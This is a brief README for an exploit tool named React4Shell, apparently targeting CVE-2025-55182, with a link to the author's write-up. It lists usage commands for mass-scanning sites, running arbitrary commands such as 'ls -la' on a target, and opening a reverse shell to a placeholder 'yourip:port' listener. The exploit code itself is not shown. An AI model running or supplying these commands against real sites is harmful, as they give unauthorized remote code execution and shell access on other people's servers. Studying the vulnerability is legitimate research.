# React4Shell

You are more then invited to read a study I wrote about the vulnerability that drove the Internet crazy :)


https://medium.com/@shakedwe2/understating-cve-2025-55182-react4shell-01b2f542976d?postPublishedType=repub

```bash
python3 React4Shell.py -u https://site.com      => Just for Scanning
python3 React4Shell.py -l list_of_sites.txt     => Just for Scanning
```

```bash
python3 React4Shell.py -u https://site.com -c 'ls -la'      => Running Command
```

```bash
python3 React4Shell.py -u https://site.com -revershell 'http://yourip:port'     => Running ReverShell (must open a listener)
```
